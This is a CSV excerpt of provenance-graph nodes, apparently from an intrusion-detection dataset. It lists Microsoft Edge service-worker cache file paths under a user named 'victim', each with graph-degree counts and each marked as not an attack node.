uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
8ddd2409-f5d9-4500-8ac2-d425a6071be6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\40eb8c22f2eba043_1'},682,False,1,1,2,1,1,2
14e2306c-7ff2-4eb2-801b-7f2bdb465043,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ce35b503af635734_0'},683,False,1,1,2,1,1,2
06d87ae4-f7e8-46c5-bb75-8053e0df901a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ce35b503af635734_1'},684,False,1,1,2,1,1,2
a0c3ea60-2516-4ba2-b698-cbd725f6c14c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\1a403dabc394cf65_0'},685,False,1,1,2,1,1,2
1f5b65b4-11d3-426e-a26c-eb1f8f640c1f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\1a403dabc394cf65_1'},686,False,1,1,2,1,1,2
728b6518-8fcf-4ee0-945d-aaaaae15b616,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\671feb07fca38274_0'},687,False,1,1,2,1,1,2
a76b33c6-6f46-453b-afa2-49431a4497be,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\671feb07fca38274_1'},688,False,1,1,2,1,1,2
81c7653c-b64c-4f1c-bf3f-98d0fea6bb7a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\39a38712b9fb879d_0'},689,False,1,1,2,1,1,2
f7c11046-36b6-4f1d-95f4-21fff3830193,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\39a38712b9fb879d_1'},690,False,1,1,2,1,1,2
9267a956-d5cd-4d6d-8446-89dbefc65194,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_da03453aa0243259_0_1'},691,False,2,0,2,2,0,2
d900b9bf-3108-4b1f-9532-a6fa2b1bc7d1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_da03453aa0243259_1_1'},692,False,2,0,2,2,0,2
9247558b-cc3f-4254-b32a-ca90471ce98a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_faee6d8d2c8b7b44_0_1'},693,False,2,0,2,2,0,2
5dca714a-e734-407a-af98-8c716e7b36be,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_faee6d8d2c8b7b44_1_1'},694,False,2,0,2,2,0,2
3e0f0f30-ded0-41d4-b6b8-27582dc5aeeb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_28faffd4bc3eef38_0_1'},695,False,2,0,2,2,0,2
509ed0c9-5248-4faa-a1e2-f19e14f2132a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_28faffd4bc3eef38_1_1'},696,False,2,0,2,2,0,2
fd3667b2-3740-49d6-a62f-612dfccb2464,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_5ef1c56e79993418_0_1'},697,False,2,0,2,2,0,2
1cfd1ead-1908-4e84-ae01-514c7ee5156d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_5ef1c56e79993418_1_1'},698,False,2,0,2,2,0,2
be073952-d38a-47e5-bf28-8afa29d2303c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_dcb2dbe275c48c9e_0_1'},699,False,2,0,2,2,0,2
d46299a2-214a-416a-ab26-4cecc4be2e8c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_dcb2dbe275c48c9e_1_1'},700,False,2,0,2,2,0,2
7c508575-2f3b-44ed-883e-9b1f526d7bdc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_671feb07fca38274_1_1'},702,False,2,0,2,2,0,2
38fe3431-efd0-49d4-8baa-4fbf3960ce0e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_06819d33dd31b502_0_1'},703,False,2,0,2,2,0,2
2d041b58-7877-478a-bc41-c66ebbbad648,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_06819d33dd31b502_1_1'},704,False,2,0,2,2,0,2
411d2468-c066-4b82-893e-5aa645dd6ce8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9a71944d0c3a81ca_0_1'},705,False,2,0,2,2,0,2
59ef8694-c37e-4b98-93f5-01b71a0cfa89,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9a71944d0c3a81ca_1_1'},706,False,2,0,2,2,0,2
d5f69c08-4f94-4b99-ae9e-e33bcd5e3a12,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_3a0508414b5e7a05_0_1'},707,False,2,0,2,2,0,2
c88efd22-e38c-4b99-a0ed-147a3f148f00,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_3a0508414b5e7a05_1_1'},708,False,2,0,2,2,0,2
f6d581e6-dff2-41ef-9469-21a2a34827d6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cc1c649c486b5cfd_0_1'},709,False,2,0,2,2,0,2
db3ec6bd-23b1-42a4-821d-88564bd59a22,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cc1c649c486b5cfd_1_1'},710,False,2,0,2,2,0,2
d56a48aa-10ba-4637-a671-7b3e3591ae2a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ce35b503af635734_0_1'},711,False,2,0,2,2,0,2
f62fdb06-cbcc-4245-beb0-860ca735672a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ce35b503af635734_1_1'},712,False,2,0,2,2,0,2
3508274f-ed1e-4cb6-84e8-436abfdfd20b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e49f5c1fe5b7ebde_0_1'},713,False,2,0,2,2,0,2
5dea4a75-9762-4f2f-99d6-b3e07a0771ec,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e49f5c1fe5b7ebde_1_1'},714,False,2,0,2,2,0,2
4beb52d8-582e-41d8-bf0c-5037cbfa38e7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_34651f1f5e3962e1_0_1'},715,False,2,0,2,2,0,2
bc1074b4-bbe3-4d26-bd5f-d2393b0d20e9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_34651f1f5e3962e1_1_1'},716,False,2,0,2,2,0,2
954da94c-958e-4af7-9ded-048d7ca19452,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c0ecc04badf9fe4e_0_1'},717,False,2,0,2,2,0,2
18d9718f-9725-44f7-bf89-c34bc8086a48,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_c0ecc04badf9fe4e_1_1'},718,False,2,0,2,2,0,2
020841ce-af93-4448-bbcc-27fd5d75c991,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_7c1a4ccbfe4649fb_0_1'},719,False,2,0,2,2,0,2
4bf091b6-fe8f-42fe-aec1-7aeee1488db5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_7c1a4ccbfe4649fb_1_1'},720,False,2,0,2,2,0,2
9f418a65-4c19-4249-af20-db746c898a74,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_63e665bfcc49a593_0_1'},721,False,2,0,2,2,0,2
1daba4c2-360c-4530-a93c-3feec2ad51b1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_63e665bfcc49a593_1_1'},722,False,2,0,2,2,0,2
99c6cc9c-ab94-4dbb-ad00-da53b351c2dd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_2e42c035390fca99_0_1'},723,False,2,0,2,2,0,2
630749b6-12b9-4db0-a576-ef2525ee0a91,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_2e42c035390fca99_1_1'},724,False,2,0,2,2,0,2
92a8c8b5-340c-4e1d-9748-31790712eefb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_eeed066dc4dfd368_0_1'},725,False,2,0,2,2,0,2
5ce1835a-b4bd-4eed-9511-0abc0e86d307,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_eeed066dc4dfd368_1_1'},726,False,2,0,2,2,0,2
7bc84fee-e834-4acf-8527-cb05bd2fa803,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8200563d2cde530a_0_1'},727,False,2,0,2,2,0,2
9b28c39b-8978-49c0-b47f-038f7e7fb7ab,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8200563d2cde530a_1_1'},728,False,2,0,2,2,0,2
ba9620e8-2a21-4596-b115-4d2c02456a40,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_36535ee8017d40d1_0_1'},729,False,2,0,2,2,0,2
03f1b66c-4dbc-4cdf-9e47-3e385a518f32,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_36535ee8017d40d1_1_1'},730,False,2,0,2,2,0,2
9d13b055-84e6-4c0f-8794-d3a9e794685e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_1a403dabc394cf65_0_1'},731,False,2,0,2,2,0,2
0b34b6d0-c1c4-4d2a-9ee4-e2ab5bdf3417,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_1a403dabc394cf65_1_1'},732,False,2,0,2,2,0,2
1642f577-6dd2-4d38-a526-19b989f79817,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8e38ffd9624144d3_0_1'},733,False,2,0,2,2,0,2
e3b1b8cc-21ed-4a6f-bfbe-44c1cad02b79,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_8e38ffd9624144d3_1_1'},734,False,2,0,2,2,0,2
7db3d0c2-279b-4395-89af-9daffc4db59c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ea153f4c5a8ed11e_0_1'},735,False,2,0,2,2,0,2
021bd138-83dc-492a-8346-1911fc219c77,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_ea153f4c5a8ed11e_1_1'},736,False,2,0,2,2,0,2
d1661497-2e48-4c4b-bec5-09b16f219bf6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9c548a46a9ecc3f3_0_1'},737,False,2,0,2,2,0,2
9026f256-739f-47e3-9f5d-7d7ce7be5c36,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9c548a46a9ecc3f3_1_1'},738,False,2,0,2,2,0,2
d98f9c1b-2612-4087-a994-f62f5a6e8886,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_aa2f6ea3c3f10dd3_0_1'},739,False,2,0,2,2,0,2
2f42fb24-0339-4886-a23f-0bd8faea209e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_aa2f6ea3c3f10dd3_1_1'},740,False,2,0,2,2,0,2
aa4655b3-f036-4754-955e-ca1d4474cd8b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e94f5e78d6937404_0_1'},741,False,2,0,2,2,0,2
eeb2361d-317e-436c-abf9-ed285666d7ac,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_e94f5e78d6937404_1_1'},742,False,2,0,2,2,0,2
8840ed1d-9981-49b2-82e4-30def2e04594,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6cb67d97a6b3818e_0_1'},743,False,2,0,2,2,0,2
8a4c57eb-1bb8-4c89-87c6-0142a3c9c809,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6cb67d97a6b3818e_1_1'},744,False,2,0,2,2,0,2
d88ba242-37d2-4db4-bd3b-508e42770a29,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cbcb980587d54e76_0_1'},745,False,2,0,2,2,0,2
915869e2-adbd-4eeb-a399-fbdb3c090e85,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_cbcb980587d54e76_1_1'},746,False,2,0,2,2,0,2
69e1c94b-c42f-4c86-9d9e-86d744bf6a71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_0e3f91883f72a37f_0_1'},747,False,2,0,2,2,0,2
eaf179b3-ff50-4a95-b820-665367b7ea6b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_0e3f91883f72a37f_1_1'},748,False,2,0,2,2,0,2
72fc5410-7c8a-46db-acd2-7da6e647dae9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6822ccb717ca4e3d_0_1'},749,False,2,0,2,2,0,2
6703f760-ed1d-42d7-a67a-a92120cc89b0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_6822ccb717ca4e3d_1_1'},750,False,2,0,2,2,0,2
99c0e84b-6e0a-4bee-a111-aa833c7ce626,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_efaf6b65ee30e35c_0_1'},751,False,2,0,2,2,0,2
e392e6f7-a84c-48ee-bdd5-c5cbab2ad205,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_efaf6b65ee30e35c_1_1'},752,False,2,0,2,2,0,2
8107ff59-3cf6-47d7-8d09-f6300c0d0e23,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9abc299c721fc6c8_0_1'},753,False,2,0,2,2,0,2
41672061-a9bb-46ec-96d6-ec8e7a682264,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_9abc299c721fc6c8_1_1'},754,False,2,0,2,2,0,2
7fffc81b-f4f9-4e5d-9721-b105b7e03f54,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_d8d32a83553fe5a8_0_1'},755,False,2,0,2,2,0,2
bbb14c36-f6c2-4b0b-a07e-5184d5540e74,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_d8d32a83553fe5a8_1_1'},756,False,2,0,2,2,0,2
f349329f-2b2d-467a-968e-d135b175616d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_fd7a9732cf9d29af_0_1'},757,False,2,0,2,2,0,2
2e285501-3619-48e7-9b53-e6fd74a11cf6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_fd7a9732cf9d29af_1_1'},758,False,2,0,2,2,0,2
22c4e0ec-aa21-44c4-bbd4-38cdf40ee7c2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_781fb11327496ef5_0_1'},759,False,2,0,2,2,0,2
